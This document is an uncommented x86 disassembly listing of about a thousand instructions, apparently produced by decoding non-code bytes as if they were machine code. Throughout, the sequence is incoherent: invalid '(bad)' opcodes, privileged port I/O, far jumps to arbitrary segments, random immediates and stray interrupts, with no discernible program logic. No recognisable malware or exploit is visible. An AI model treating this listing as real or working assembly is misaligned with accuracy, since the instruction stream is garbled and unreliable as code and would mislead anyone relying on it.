  41b459:	add    DWORD PTR [ecx-0x6a6f0cc],ebx
  41b45f:	and    dh,bl
  41b461:	lock cmp BYTE PTR [edi-0x15691508],0x57
  41b469:	std    
  41b46a:	adc    BYTE PTR [ebp+eax*8-0x63170743],0xf3
  41b472:	add    BYTE PTR [edx],al
  41b474:	in     al,dx
  41b475:	xor    ch,BYTE PTR [edx]
  41b477:	cdq    
  41b478:	fst    DWORD PTR [edi+0x3eb7520f]
  41b47e:	(bad)  
  41b47f:	push   ss
  41b480:	out    0x3c,al
  41b482:	nop
  41b483:	adc    eax,0x7cb7fa04
  41b488:	loop   0x41b44c
  41b48a:	repz mov es,ebp
  41b48d:	test   eax,0x7785a2bd
  41b492:	adc    dh,BYTE PTR ds:0xb4caa9b7
  41b498:	into   
  41b499:	jbe    0x41b4ba
  41b49b:	(bad)  
  41b49c:	and    eax,0xece140c5
  41b4a1:	idiv   DWORD PTR [esi+edi*1+0x38]
  41b4a5:	jae    0x41b429
  41b4a7:	inc    esp
  41b4a8:	mov    eax,ds:0xfd1a9745
  41b4ad:	mov    cl,BYTE PTR [eax+0x641226cd]
  41b4b3:	stos   BYTE PTR es:[edi],al
  41b4b4:	mov    DWORD PTR [eax],edx
  41b4b6:	inc    ebx
  41b4b7:	xor    al,0x89
  41b4b9:	mov    edi,DWORD PTR cs:0xcea21f75
  41b4c0:	sub    al,0x21
  41b4c2:	jne    0x41b525
  41b4c4:	jmp    0x9078:0x610d463e
  41b4cb:	xor    al,0x8b
  41b4cd:	bound  eax,QWORD PTR [edi+0x61cad68a]
  41b4d3:	popf   
  41b4d4:	addr16 and al,0x13
  41b4d7:	sub    dh,BYTE PTR [edx+0x6d]
  41b4da:	and    al,0xef
  41b4dc:	clc    
  41b4dd:	out    dx,eax
  41b4de:	lds    esp,FWORD PTR [di]
  41b4e1:	test   al,0xa7
  41b4e3:	div    cl
  41b4e5:	sub    eax,0xd1290d8f
  41b4ea:	adc    cx,WORD PTR [ecx+0x48]
  41b4ee:	sub    eax,0xf963a21e
  41b4f3:	mov    eax,0x38951fa9
  41b4f8:	xlat   BYTE PTR ds:[ebx]
  41b4f9:	imul   ebx,ebx,0x11d52c67
  41b4ff:	nop
  41b500:	cmp    DWORD PTR [ebp-0x77],0xffffffd6
  41b504:	daa    
  41b505:	cmc    
  41b506:	cmp    al,0xa0
  41b508:	dec    eax
  41b509:	loope  0x41b535
  41b50b:	add    ebx,0x5f
  41b50e:	pop    edx
  41b50f:	popf   
  41b510:	xchg   BYTE PTR [ebp-0x2f],ah
  41b513:	nop
  41b514:	sbb    ah,BYTE PTR [ecx+0x6ad1f396]
  41b51a:	(bad)  
  41b51b:	hlt    
  41b51c:	aad    0x69
  41b51e:	jg     0x41b561
  41b520:	cmp    esp,ebx
  41b522:	jmp    0xed39fa83
  41b527:	jbe    0x41b554
  41b529:	add    edx,ecx
  41b52b:	inc    esi
  41b52c:	add    dh,BYTE PTR [edi-0xc7c985f]
  41b532:	push   esp
  41b533:	mov    dh,dl
  41b535:	jnp    0x41b541
  41b537:	adc    al,0xac
  41b539:	and    eax,0xb7674e0
  41b53e:	mov    WORD PTR fs:[ebx-0x33],ss
  41b542:	xchg   esp,eax
  41b543:	inc    ebp
  41b544:	jo     0x41b519
  41b546:	inc    esi
  41b547:	inc    edx
  41b548:	add    DWORD PTR [edi+0x2586c220],ebp
  41b54e:	and    dh,BYTE PTR [esi-0x2415cc91]
  41b554:	call   0x80efd05e
  41b559:	sub    al,0x36
  41b55b:	fisub  DWORD PTR [ecx-0x7d]
  41b55e:	jns    0x41b5a4
  41b560:	fcomi  st,st(5)
  41b562:	nop
  41b563:	dec    esi
  41b564:	xor    BYTE PTR [esi],al
  41b566:	(bad)  
  41b568:	dec    ebx
  41b569:	mov    esi,0x9e5dc1d4
  41b56e:	leave  
  41b56f:	(bad)  
  41b570:	jnp    0x41b5ab
  41b572:	mov    ch,0x9b
  41b574:	mov    ebp,0xef12a2af
  41b579:	xor    ebp,DWORD PTR [edi]
  41b57b:	mov    ch,0xd
  41b57d:	stos   DWORD PTR es:[edi],eax
  41b57e:	call   0x6a08:0xdf6cf69e
  41b585:	ret    
  41b586:	xor    eax,eax
  41b588:	adc    esi,DWORD PTR [edx-0xc3b8beb]
  41b58e:	mov    edx,cs
  41b590:	fild   WORD PTR [eax-0xbc62f19]
  41b596:	lods   al,BYTE PTR ds:[esi]
  41b597:	push   edi
  41b598:	add    ebp,0x4f
  41b59b:	into   
  41b59c:	inc    esp
  41b59d:	and    DWORD PTR [ebp+eiz*1-0x36edd4d],eax
  41b5a4:	mov    eax,ds:0x499d7d6e
  41b5a9:	and    DWORD PTR [ecx+0x36],esp
  41b5ac:	jle    0x41b61f
  41b5ae:	das    
  41b5af:	scas   al,BYTE PTR es:[edi]
  41b5b0:	pop    ds
  41b5b1:	ret    0x9d3d
  41b5b4:	dec    ebp
  41b5b5:	aaa    
  41b5b6:	pop    ds
  41b5b7:	push   ebx
  41b5b8:	sbb    eax,0x300bf74d
  41b5bd:	scas   eax,DWORD PTR es:[edi]
  41b5be:	push   esi
  41b5bf:	cdq    
  41b5c0:	cmc    
  41b5c1:	aas    
  41b5c2:	in     al,dx
  41b5c3:	adc    cl,BYTE PTR [ecx-0x41]
  41b5c6:	in     al,dx
  41b5c7:	into   
  41b5c8:	push   ss
  41b5c9:	add    ah,BYTE PTR [edi+edi*1-0x7a]
  41b5cd:	ret    
  41b5ce:	xchg   ebp,eax
  41b5cf:	inc    eax
  41b5d0:	mov    esp,0x48d52690
  41b5d5:	xor    al,0xa2
  41b5d7:	daa    
  41b5d8:	mov    eax,0xca7c56e5
  41b5dd:	adc    cl,BYTE PTR [edx-0x307c08a3]
  41b5e3:	pop    eax
  41b5e4:	int    0x57
  41b5e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5e7:	sub    DWORD PTR [esi-0x3406624a],ebp
  41b5ed:	inc    ecx
  41b5ee:	push   eax
  41b5ef:	sbb    ch,BYTE PTR [esi]
  41b5f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5f2:	mov    cl,0x18
  41b5f4:	and    eax,0x5a972e35
  41b5f9:	inc    esp
  41b5fa:	or     edi,edi
  41b5fc:	xchg   edi,eax
  41b5fd:	or     eax,DWORD PTR [ebp+0x47]
  41b600:	mov    ebx,0xf7dbe728
  41b605:	and    DWORD PTR [edx],ebx
  41b607:	adc    eax,0x2827cf05
  41b60c:	add    edi,DWORD PTR [ebx+0x54]
  41b60f:	outs   dx,DWORD PTR ds:[esi]
  41b610:	sbb    eax,DWORD PTR [eax]
  41b612:	pop    es
  41b613:	mov    al,0x7c
  41b615:	mov    ah,0xca
  41b617:	dec    ecx
  41b618:	dec    ebp
  41b619:	push   esi
  41b61a:	pop    ds
  41b61b:	addr16 in eax,0x13
  41b61e:	inc    esp
  41b61f:	cdq    
  41b620:	xchg   esi,eax
  41b621:	int    0x77
  41b623:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b624:	adc    eax,0xc50b0c56
  41b629:	cmp    DWORD PTR [eax*8+0x1ab36424],eax
  41b630:	dec    esi
  41b631:	xor    DWORD PTR [edi+0x7f],edx
  41b634:	jae    0x41b5c9
  41b636:	out    0x8c,eax
  41b638:	push   es
  41b639:	sar    BYTE PTR [eax+0x6],cl
  41b63c:	and    al,0x96
  41b63e:	pop    eax
  41b63f:	clc    
  41b640:	pop    ebx
  41b641:	outs   dx,DWORD PTR ds:[esi]
  41b642:	add    DWORD PTR [esi-0x4273236b],esp
  41b648:	sub    eax,0x41619a2c
  41b64d:	cs cmp eax,0x200485d7
  41b653:	mov    ah,0x80
  41b655:	fwait
  41b656:	push   ss
  41b657:	pop    edi
  41b658:	inc    ebp
  41b659:	xchg   ebp,eax
  41b65a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b65b:	out    dx,eax
  41b65c:	jae    0x41b6d3
  41b65e:	dec    ebx
  41b65f:	test   al,0xa0
  41b661:	hlt    
  41b662:	mov    ah,0xa3
  41b664:	mov    bh,0xdf
  41b666:	adc    DWORD PTR [ebx],eax
  41b668:	inc    eax
  41b669:	cmp    edx,DWORD PTR [ebx-0x19]
  41b66c:	add    eax,0x96053600
  41b671:	mov    ebx,0xc6eceb4a
  41b676:	pusha  
  41b677:	push   cs
  41b678:	mov    eax,ds:0x987ee12b
  41b67d:	cmc    
  41b67e:	xchg   dh,bh
  41b680:	cmp    edi,DWORD PTR [eax-0x6a]
  41b683:	mov    bl,0x73
  41b685:	inc    ebx
  41b686:	inc    eax
  41b687:	xor    ah,dh
  41b689:	enter  0xbee8,0xb3
  41b68d:	pop    edx
  41b68e:	push   edx
  41b68f:	clc    
  41b690:	repz cld 
  41b692:	cmp    al,0x26
  41b694:	pusha  
  41b695:	inc    ecx
  41b696:	inc    eax
  41b697:	push   ebp
  41b698:	adc    DWORD PTR [eax],ebp
  41b69a:	add    al,0xf6
  41b69c:	xor    ebp,DWORD PTR [ebx+edi*4]
  41b69f:	outs   dx,DWORD PTR ds:[esi]
  41b6a0:	inc    edi
  41b6a1:	adc    bl,BYTE PTR ds:[eax]
  41b6a4:	add    al,0xf
  41b6a6:	cmp    bl,BYTE PTR [esi]
  41b6a8:	cwde   
  41b6a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6aa:	rcr    DWORD PTR [edi],cl
  41b6ac:	aam    0x4f
  41b6ae:	stos   DWORD PTR es:[edi],eax
  41b6af:	cmc    
  41b6b0:	fbld   TBYTE PTR [ebx+ebp*2]
  41b6b3:	outs   dx,DWORD PTR ds:[esi]
  41b6b4:	popa   
  41b6b5:	sub    al,0x8f
  41b6b7:	test   al,0xb1
  41b6b9:	push   cs
  41b6ba:	xchg   edi,eax
  41b6bb:	imul   edx,esi,0x414619ac
  41b6c1:	fdiv   DWORD PTR [edi]
  41b6c3:	jnp    0x41b653
  41b6c5:	shl    ch,cl
  41b6c7:	popa   
  41b6c8:	call   0x8f635c85
  41b6cd:	gs leave 
  41b6cf:	aas    
  41b6d0:	jae    0x41b733
  41b6d2:	imul   esi,DWORD PTR [ebx],0x23
  41b6d5:	test   BYTE PTR [esi+0x260a47c9],dh
  41b6db:	retf   0xcd19
  41b6de:	rol    DWORD PTR [ebx+esi*1],cl
  41b6e1:	or     bl,bh
  41b6e3:	pop    eax
  41b6e4:	jmp    0x8f63:0x46f4
  41b6ea:	dec    edx
  41b6eb:	push   es
  41b6ec:	push   esp
  41b6ed:	jo     0x41b670
  41b6ef:	mov    esi,0x58bb7721
  41b6f4:	repz lea esi,ds:0x5e823af
  41b6fb:	sbb    ah,BYTE PTR [esp+eax*2]
  41b6fe:	cmp    DWORD PTR [ebx-0x23b3ceab],ecx
  41b704:	push   esp
  41b705:	push   ss
  41b706:	test   eax,0xb85a1f59
  41b70b:	inc    eax
  41b70c:	cld    
  41b70d:	jne    0x41b6e6
  41b70f:	cmp    esp,0x0
  41b712:	xor    DWORD PTR [ecx-0xb95a312],ecx
  41b718:	out    0xe3,al
  41b71a:	pusha  
  41b71b:	jmp    0x41b737
  41b71d:	pusha  
  41b71e:	sbb    DWORD PTR [edi],ebx
  41b720:	adc    edi,ebx
  41b722:	adc    DWORD PTR [edx-0x72696e72],esp
  41b728:	or     DWORD PTR [edi-0x1e],0xa55d4801
  41b72f:	jne    0x41b71e
  41b731:	imul   esp,DWORD PTR [eax+eiz*8],0x32
  41b735:	ret    
  41b736:	sbb    eax,0x71acc726
  41b73b:	adc    al,0x9a
  41b73d:	outs   dx,DWORD PTR ds:[esi]
  41b73e:	jns    0x41b77c
  41b740:	fisttp QWORD PTR [bp-0x80]
  41b744:	dec    eax
  41b745:	in     eax,0x86
  41b747:	loope  0x41b700
  41b749:	sbb    eax,DWORD PTR [edi]
  41b74b:	mov    dl,0x78
  41b74d:	xchg   DWORD PTR [edx+0x61],eax
  41b750:	or     eax,0x5a8b09e0
  41b755:	push   es
  41b756:	ins    BYTE PTR es:[edi],dx
  41b757:	mov    bl,0xd8
  41b759:	adc    al,0x13
  41b75b:	cld    
  41b75c:	push   ebx
  41b75d:	mov    eax,edx
  41b75f:	int3   
  41b760:	xchg   edi,eax
  41b761:	inc    edx
  41b762:	sbb    al,0xec
  41b764:	mov    WORD PTR [ecx+0x38],es
  41b767:	push   esi
  41b768:	dec    ebx
  41b769:	repz sbb ecx,DWORD PTR [esi]
  41b76c:	cmp    bl,BYTE PTR [edi-0x4a]
  41b76f:	xor    eax,0xb1d7934a
  41b774:	mov    esi,0x6a0db9d9
  41b779:	mov    dh,0x87
  41b77b:	push   ecx
  41b77c:	iret   
  41b77d:	fidiv  DWORD PTR [eax+0x473a87dc]
  41b783:	push   0x5df71991
  41b788:	mov    DWORD PTR [edx-0x35],ecx
  41b78b:	inc    ebp
  41b78c:	cdq    
  41b78d:	add    eax,0x7b44c830
  41b792:	push   esp
  41b793:	sahf   
  41b794:	jae    0x41b7de
  41b796:	fdivrp st(3),st
  41b798:	sub    al,0xa8
  41b79a:	std    
  41b79b:	stos   BYTE PTR es:[edi],al
  41b79c:	pop    edi
  41b79d:	push   ecx
  41b79e:	loop   0x41b7db
  41b7a0:	jecxz  0x41b7f6
  41b7a2:	inc    ebx
  41b7a3:	pop    esi
  41b7a4:	arpl   si,di
  41b7a6:	(bad)  
  41b7a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7a8:	adc    dl,BYTE PTR [eax+eax*2]
  41b7ab:	dec    ebp
  41b7ac:	or     eax,0x97bda1de
  41b7b1:	mov    esi,0xd4cbf7fe
  41b7b6:	xor    BYTE PTR [ebp-0x43d3dd4c],bh
  41b7bc:	inc    esp
  41b7bd:	xlat   BYTE PTR ds:[ebx]
  41b7be:	aas    
  41b7bf:	ret    0x2305
  41b7c2:	dec    esp
  41b7c3:	test   BYTE PTR [ebx],bl
  41b7c5:	add    DWORD PTR [ebp-0x6907de22],esp
  41b7cb:	daa    
  41b7cc:	sub    DWORD PTR [ebx+0x44],esi
  41b7cf:	ds dec edx
  41b7d1:	adc    ebp,DWORD PTR [ebx+0x50]
  41b7d4:	pop    esi
  41b7d5:	or     ecx,esp
  41b7d7:	cld    
  41b7d8:	outs   dx,DWORD PTR ds:[esi]
  41b7d9:	mov    di,0xb615
  41b7dd:	pop    ss
  41b7de:	mov    ds:0xa82f028f,al
  41b7e3:	test   dl,ch
  41b7e5:	xchg   DWORD PTR [ebx+0x0],edx
  41b7e8:	mov    ds:0xbc98b9a7,al
  41b7ed:	adc    dh,ah
  41b7ef:	jg     0x41b789
  41b7f1:	in     eax,0x25
  41b7f3:	pop    ecx
  41b7f4:	mov    eax,0x70ce2d9c
  41b7f9:	ret    
  41b7fa:	xor    eax,0x5edf4fc1
  41b7ff:	or     ebx,ebx
  41b801:	enter  0x8e86,0x24
  41b805:	mov    WORD PTR [esp+eax*1],?
  41b808:	mov    eax,?
  41b80a:	push   edx
  41b80b:	dec    esp
  41b80c:	loope  0x41b7b9
  41b80e:	clc    
  41b80f:	inc    edi
  41b810:	icebp  
  41b811:	ret    
  41b812:	adc    ebx,DWORD PTR [ecx-0x5c4e0f2c]
  41b818:	xchg   DWORD PTR [esi+ebx*4+0x35],ecx
  41b81c:	mov    ebx,0x34160448
  41b821:	jp     0x41b7b8
  41b823:	test   DWORD PTR [edx-0x55a8e006],0xd0e2782b
  41b82d:	lods   eax,DWORD PTR ds:[esi]
  41b82e:	je     0x41b89e
  41b830:	clc    
  41b831:	fs sub ch,cl
  41b834:	scas   al,BYTE PTR es:[edi]
  41b835:	scas   eax,DWORD PTR es:[edi]
  41b836:	loope  0x41b881
  41b838:	inc    edi
  41b839:	or     edi,DWORD PTR [ebx]
  41b83b:	std    
  41b83c:	lds    edx,FWORD PTR [edi-0x355109cc]
  41b842:	sub    eax,0xdd6f931
  41b847:	sub    edx,DWORD PTR [eax]
  41b849:	jge    0x41b8b1
  41b84b:	clc    
  41b84c:	fnstcw WORD PTR [esi]
  41b84e:	in     al,0xd7
  41b850:	dec    edx
  41b851:	test   BYTE PTR [esi-0x274b53c3],bl
  41b857:	jmp    0xa0d8:0x8f0ed7ad
  41b85e:	aas    
  41b85f:	(bad)  
  41b860:	mov    bh,0xfd
  41b862:	xor    BYTE PTR [edx-0x4b],0xa2
  41b866:	xchg   ebx,eax
  41b867:	or     eax,0xb6f4fdd9
  41b86c:	jno    0x41b8a3
  41b86e:	ret    0x8d5d
  41b871:	jg     0x41b7f6
  41b873:	jl     0x41b856
  41b875:	adc    BYTE PTR [esi],ah
  41b877:	je     0x41b8eb
  41b879:	loopne 0x41b858
  41b87b:	es aad 0x19
  41b87e:	int    0xfb
  41b880:	add    bh,dl
  41b882:	jg     0x41b890
  41b884:	mov    ah,0x30
  41b886:	mov    al,ds:0xb87b7b7a
  41b88b:	or     al,0xd7
  41b88d:	add    eax,0x3a5695e0
  41b892:	push   ecx
  41b893:	pop    es
  41b894:	imul   esp,DWORD PTR [ebp+0x494fca3e],0x70085d65
  41b89e:	sub    al,0x86
  41b8a0:	or     dh,BYTE PTR [esi]
  41b8a2:	dec    esp
  41b8a3:	jmp    0xaaf94d96
  41b8a8:	ss retf 
  41b8aa:	mov    dh,0xdd
  41b8ac:	jno    0x41b8d1
  41b8ae:	jg     0x41b880
  41b8b0:	xor    ah,BYTE PTR [edx-0x2f1f3511]
  41b8b6:	shl    BYTE PTR [ebx-0x33c1fc66],0x6d
  41b8bd:	rol    bh,0xed
  41b8c0:	mov    ch,cl
  41b8c2:	sti    
  41b8c3:	jo     0x41b873
  41b8c5:	push   ecx
  41b8c6:	(bad)  
  41b8c8:	retf   0x2f9d
  41b8cb:	xchg   edx,eax
  41b8cc:	xchg   ecx,eax
  41b8cd:	cld    
  41b8ce:	add    ebx,DWORD PTR [ecx+edi*4]
  41b8d1:	pop    edx
  41b8d2:	rcr    esi,cl
  41b8d4:	fadd   DWORD PTR [edx-0x7d]
  41b8d7:	jae    0x41b8e0
  41b8d9:	cli    
  41b8da:	xchg   DWORD PTR [ecx],ecx
  41b8dc:	or     BYTE PTR [ebx],cl
  41b8de:	add    ebp,0x2fa652f1
  41b8e4:	inc    edi
  41b8e5:	pop    es
  41b8e6:	dec    edx
  41b8e7:	push   esp
  41b8e8:	sub    al,0xfb
  41b8ea:	leave  
  41b8eb:	cwde   
  41b8ec:	retf   0x485c
  41b8ef:	into   
  41b8f0:	push   DWORD PTR [ebp+ecx*8+0x35]
  41b8f4:	fmul   DWORD PTR [eax]
  41b8f6:	ins    BYTE PTR es:[edi],dx
  41b8f7:	xchg   esp,eax
  41b8f8:	into   
  41b8f9:	and    al,BYTE PTR ds:0x2e728943
  41b8ff:	shl    DWORD PTR [edx+0x44c886b1],cl
  41b905:	test   bx,bx
  41b908:	push   edx
  41b909:	arpl   WORD PTR [ecx+0x2355d0b],bp
  41b90f:	pop    ecx
  41b910:	idiv   BYTE PTR [eax-0x3]
  41b913:	(bad)  
  41b914:	mov    ds:0x5d287b24,eax
  41b919:	xchg   ax,ax
  41b91b:	jp     0x41b8b9
  41b91d:	je     0x41b99a
  41b91f:	pushf  
  41b920:	mov    edx,0x563ab655
  41b925:	jecxz  0x41b8db
  41b927:	mov    ebx,DWORD PTR [eax-0x38]
  41b92a:	test   BYTE PTR [ebx-0x21e828c5],bh
  41b930:	out    0x7d,al
  41b932:	sub    bl,BYTE PTR [esi-0x33f57853]
  41b938:	popa   
  41b939:	adc    BYTE PTR [ecx],dh
  41b93b:	in     eax,dx
  41b93c:	test   DWORD PTR [esi],ecx
  41b93e:	inc    edx
  41b93f:	pop    ebp
  41b940:	push   es
  41b941:	call   0xa45a0cf0
  41b946:	dec    ebp
  41b947:	sub    cl,BYTE PTR [edx+0x30]
  41b94a:	dec    esp
  41b94b:	call   0x3d41:0x71dea38f
  41b952:	into   
  41b953:	inc    ecx
  41b954:	mov    al,ds:0x14969052
  41b959:	add    al,0xb9
  41b95b:	xor    ah,BYTE PTR [edi-0x172e2572]
  41b961:	or     esp,DWORD PTR [ebx-0x697e5807]
  41b967:	es mov ecx,0x22ec1a21
  41b96d:	xor    DWORD PTR [eax-0x67],ebp
  41b970:	jp     0x41b9a3
  41b972:	inc    eax
  41b973:	push   esp
  41b974:	inc    eax
  41b975:	add    eax,0x8b2df5f2
  41b97a:	add    al,ch
  41b97c:	aas    
  41b97d:	ja     0x41b926
  41b97f:	mov    ebx,0xc3f0e012
  41b984:	mov    DWORD PTR [ecx+0x5a],ebp
  41b987:	or     ecx,0x5e
  41b98a:	mov    ebx,edx
  41b98c:	ja     0x41b92b
  41b98e:	imul   ebx,DWORD PTR [esi+0x71],0xffffffcc
  41b992:	add    DWORD PTR [edi+0x19],esp
  41b995:	or     eax,0xfa3848ed
  41b99a:	loop   0x41b982
  41b99c:	rol    BYTE PTR [ecx+0x32d46783],0x3
  41b9a3:	jnp    0x41b9a0
  41b9a5:	icebp  
  41b9a6:	pop    ss
  41b9a7:	mov    al,BYTE PTR [ebx-0x37]
  41b9aa:	push   0xffffffaf
  41b9ac:	cli    
  41b9ad:	in     al,0x89
  41b9af:	in     al,dx
  41b9b0:	push   ecx
  41b9b1:	cmp    DWORD PTR [ebx-0x32],ebx
  41b9b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9b5:	adc    eax,0x2cf41297
  41b9ba:	inc    edx
  41b9bb:	pusha  
  41b9bc:	scas   al,BYTE PTR es:[edi]
  41b9bd:	xor    eax,0x10e19fd4
  41b9c2:	(bad)  
  41b9c3:	loopne 0x41b95e
  41b9c5:	mov    WORD PTR [edi+0x17],ds
  41b9c8:	add    DWORD PTR [edi+0x3294f505],0xffffff87
  41b9cf:	xchg   esi,eax
  41b9d0:	lahf   
  41b9d1:	fbld   TBYTE PTR [edi+0x5e]
  41b9d4:	cmp    BYTE PTR [esi],bl
  41b9d6:	jmp    edi
  41b9d8:	sub    al,0xc0
  41b9da:	in     al,0x73
  41b9dc:	dec    ecx
  41b9dd:	xor    DWORD PTR [eax],0x24
  41b9e0:	push   0xffffffe0
  41b9e2:	pop    eax
  41b9e3:	jge    0x41b9cf
  41b9e5:	aaa    
  41b9e6:	pop    esp
  41b9e7:	xchg   BYTE PTR [edi+0x11d9fedd],al
  41b9ed:	ret    0x613d
  41b9f0:	jg     0x41ba50
  41b9f2:	outs   dx,BYTE PTR ds:[esi]
  41b9f3:	adc    al,0x3a
  41b9f5:	test   eax,0xd40a73c1
  41b9fa:	add    esp,DWORD PTR [edx]
  41b9fc:	inc    ebp
  41b9fd:	push   ebx
  41b9fe:	aas    
  41b9ff:	jecxz  0x41b9e1
  41ba01:	add    BYTE PTR [eax-0x217dcbc3],dl
  41ba07:	adc    eax,0x7d81b378
  41ba0c:	loope  0x41b9f0
  41ba0e:	or     bh,BYTE PTR [edi-0x6c]
  41ba11:	or     cl,BYTE PTR [edi-0x2ff52afe]
  41ba17:	push   0xffffffd7
  41ba19:	xor    al,0xf7
  41ba1b:	cmp    BYTE PTR [ebp+0x507c8129],ch
  41ba21:	addr16 ret 0xe030
  41ba25:	(bad)  
  41ba27:	retf   
  41ba28:	adc    BYTE PTR [esi-0x53c9edcf],al
  41ba2e:	repz lahf 
  41ba30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba31:	cmp    DWORD PTR [eax+0x74f35063],ebx
  41ba37:	add    BYTE PTR [ebx+ecx*4],bl
  41ba3a:	hlt    
  41ba3b:	sub    eax,0x86bd4499
  41ba40:	in     eax,dx
  41ba41:	add    cl,al
  41ba43:	xchg   edi,eax
  41ba44:	pop    ebx
  41ba45:	push   edx
  41ba46:	dec    ecx
  41ba47:	(bad)  
  41ba48:	push   0xfffffff3
  41ba4a:	das    
  41ba4b:	mov    ch,0x92
  41ba4d:	out    0x8e,eax
  41ba4f:	jge    0x41ba06
  41ba51:	(bad)
  41ba54:	jmp    0xd33ef486
  41ba59:	xchg   esi,eax
  41ba5a:	xchg   ebx,eax
  41ba5b:	pop    ebx
  41ba5c:	scas   eax,DWORD PTR es:[edi]
  41ba5d:	pop    ss
  41ba5e:	pusha  
  41ba5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba60:	shl    DWORD PTR [ebp+0x1b],1
  41ba63:	sbb    DWORD PTR [ecx-0x774b8b6f],0x95a75459
  41ba6d:	fcos   
  41ba6f:	psubsb mm0,QWORD PTR [esi-0x132ab262]
  41ba76:	adc    DWORD PTR [esi+0x1609214d],esp
  41ba7c:	mov    al,ds:0xef17a8bb
  41ba81:	int    0x79
  41ba83:	dec    ecx
  41ba84:	pop    ds
  41ba85:	addr16 hlt 
  41ba87:	rcr    BYTE PTR [eiz*4+0x4776f28c],cl
  41ba8e:	ret    
  41ba8f:	and    BYTE PTR [ebp+eax*8-0x72e69841],bl
  41ba96:	jno    0x41ba78
  41ba98:	(bad)  
  41ba99:	mov    ds:0x6548a68f,eax
  41ba9e:	inc    ebp
  41ba9f:	add    eax,0x9c010291
  41baa4:	push   ds
  41baa5:	shl    BYTE PTR [ebx],0x83
  41baa8:	in     al,dx
  41baa9:	mov    al,0x16
  41baab:	push   edi
  41baac:	jno    0x41ba99
  41baae:	fwait
  41baaf:	lds    ebx,FWORD PTR [edx-0x26]
  41bab2:	xchg   BYTE PTR [esi],dl
  41bab4:	imul   esp,DWORD PTR [ecx+esi*8+0x69],0xccee30b7
  41babc:	xor    al,dl
  41babe:	rcr    DWORD PTR [ebp+0x22],cl
  41bac1:	loope  0x41bb1d
  41bac3:	mov    edi,0xa31cf83
  41bac8:	and    al,0x49
  41baca:	ja     0x41ba74
  41bacc:	dec    edx
  41bacd:	fsubr  DWORD PTR [ebx]
  41bacf:	or     eax,0x8f896880
  41bad4:	cli    
  41bad5:	imul   ebp,DWORD PTR [esi+0x2d],0xffffffdc
  41bad9:	jo     0x41bad0
  41badb:	mov    ebp,fs
  41badd:	or     BYTE PTR [edx],bl
  41badf:	xor    al,0xe7
  41bae1:	xchg   esi,eax
  41bae2:	rol    DWORD PTR [edx-0x5b],1
  41bae5:	add    DWORD PTR [ebp-0x70],esi
  41bae8:	and    ebp,DWORD PTR [ebp-0x66e7a22a]
  41baee:	loope  0x41bae4
  41baf0:	or     BYTE PTR [ebp+0x70096885],ch
  41baf6:	es (bad) 
  41baf8:	mov    bl,0xc9
  41bafa:	imul   ebp,DWORD PTR [edi+0x47],0x29282c79
  41bb01:	arpl   WORD PTR [ebp+0x57],bp
  41bb04:	or     bl,BYTE PTR [edx-0x49]
  41bb07:	dec    ebp
  41bb08:	dec    esp
  41bb09:	not    DWORD PTR [ebp+0x20]
  41bb0c:	mov    esp,ebp
  41bb0e:	adc    al,0x35
  41bb10:	mov    al,ds:0x8595bfc3
  41bb15:	xchg   ecx,eax
  41bb16:	mov    ch,0x5f
  41bb18:	outs   dx,BYTE PTR ds:[esi]
  41bb19:	leave  
  41bb1a:	sub    esp,DWORD PTR [esi]
  41bb1c:	ds push eax
  41bb1e:	sbb    al,0xe4
  41bb20:	data16 clc 
  41bb22:	ret    
  41bb23:	push   0xffffff9e
  41bb25:	push   ecx
  41bb26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb27:	(bad)  
  41bb28:	call   DWORD PTR [edx]
  41bb2a:	xchg   ebp,eax
  41bb2b:	call   0x388f40d9
  41bb30:	jmp    0x41bb4a
  41bb32:	je     0x41babb
  41bb34:	sbb    dl,BYTE PTR [edx+0x2d]
  41bb37:	das    
  41bb38:	xor    eax,0x3e32ed3c
  41bb3d:	push   0xea9e89c6
  41bb42:	jo     0x41bbb6
  41bb44:	and    BYTE PTR [ecx],ah
  41bb46:	cmp    eax,0x498bedf6
  41bb4b:	lahf   
  41bb4c:	sub    bl,cl
  41bb4e:	add    cl,dl
  41bb50:	mov    ch,0x5f
  41bb52:	sub    ebx,DWORD PTR [edi-0x7a]
  41bb55:	mov    bh,0x26
  41bb57:	je     0x41bafd
  41bb59:	jp     0x41bbad
  41bb5b:	add    eax,0x4feac8e7
  41bb60:	adc    eax,edx
  41bb62:	xor    esp,ecx
  41bb64:	fs add eax,0x25da5df8
  41bb6a:	dec    edx
  41bb6b:	call   0xa635ce5b
  41bb70:	scas   eax,DWORD PTR es:[edi]
  41bb71:	mov    dl,0x21
  41bb73:	or     eax,0x7c3bb16a
  41bb78:	adc    eax,0xb4dca82a
  41bb7d:	retf   
  41bb7e:	push   0xffffffb9
  41bb80:	fild   DWORD PTR [edi-0x7af538ad]
  41bb86:	and    al,0xa4
  41bb88:	(bad)  
  41bb89:	mov    al,ds:0x26d8470a
  41bb8e:	sbb    BYTE PTR [ecx+0x68ff7c93],bl
  41bb94:	in     eax,dx
  41bb95:	xor    al,0xaf
  41bb97:	in     eax,dx
  41bb98:	scas   al,BYTE PTR es:[edi]
  41bb99:	xchg   edi,eax
  41bb9a:	or     eax,0x78039df9
  41bb9f:	mov    ebx,0x3eb1f8ed
  41bba4:	mov    esp,DWORD PTR [edi-0x5fdecfa9]
  41bbaa:	dec    ecx
  41bbab:	fldenv [eax]
  41bbad:	fstp   QWORD PTR [edx-0x4e]
  41bbb0:	fwait
  41bbb1:	jo     0x41bbeb
  41bbb3:	inc    ebx
  41bbb4:	retf   
  41bbb5:	xor    eax,0xdbad331a
  41bbba:	mov    dh,0x89
  41bbbc:	mov    ds:0x61137475,eax
  41bbc1:	sub    DWORD PTR [edi+ebp*8-0x35],esp
  41bbc5:	jmp    0x57fa:0xc2c873b9
  41bbcc:	xchg   BYTE PTR [ecx+edx*4],al
  41bbcf:	or     DWORD PTR [edi],edi
  41bbd1:	ficomp DWORD PTR [edx]
  41bbd3:	fdivrp st(4),st
  41bbd5:	fisub  DWORD PTR [ecx-0x58625693]
